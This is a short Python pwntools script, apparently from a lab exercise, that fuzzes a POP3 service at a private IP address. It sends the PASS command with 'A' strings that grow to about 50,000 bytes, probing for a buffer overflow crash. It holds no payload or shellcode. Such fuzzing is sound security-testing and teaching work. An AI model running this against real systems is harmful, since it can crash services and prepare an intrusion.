#!/usr/share/python

import socket
from pwn import *
import time

def Fuzzer():

	buffer = ["A"]
	counter = 500
	while len(buffer) <= 100:
		buffer.append("A" * counter)
		counter = counter + 500
	try:
		r = remote('192.168.80.133', 110)

		for string in buffer:
			print "Fuzzing with %s bytes of payload" %len(string)
			r.send('USER username')
			r.recv(2048)
			r.send('PASS ' + string)
			r.recv(2048)
			time.sleep(1)
	except:
		print "Couldn't connect to target"


def main():

	print (
	'''
	 _______ _______ _______ _______ _______ _______
	|\     /|\     /|\     /|\     /|\     /|\     /|
	| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
	| |   | | |   | | |   | | |   | | |   | | |   | |
	| |F  | | |u  | | |z  | | |z  | | |M  | | |e  | |
	| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
	|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|

	'''
	)

	Fuzzer()

if __name__ == '__main__':
	main()